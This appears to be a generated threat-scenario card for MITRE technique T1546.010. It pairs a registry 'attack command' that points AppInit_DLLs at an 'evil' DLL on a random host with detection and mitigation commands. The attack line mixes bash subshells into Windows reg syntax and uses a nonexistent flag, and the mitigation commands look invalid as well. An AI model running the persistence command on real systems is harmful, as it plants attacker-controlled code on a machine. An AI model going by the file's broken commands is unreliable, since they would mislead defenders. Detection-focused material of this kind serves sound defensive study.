---
type: campaign
scenario_id: 279
tactic: Persistence
technique: "T1546.010: AppInit DLLs"
technique_id: T1546.010
tags: [campaign, lotl, persistence]
---

# Registering malicious AppInit DLL remotely for persistence.

## Threat Description
Registering malicious AppInit DLL remotely for persistence.

## Attack Command
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor AppInit DLLs: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs | findstr http`; Event ID 4657.

## Mitigation
Restrict AppInit writes: `regini -h deny "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows"`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block AppInit' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote AppInit DLL tampering and suggest firewall rules.

## References
- MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
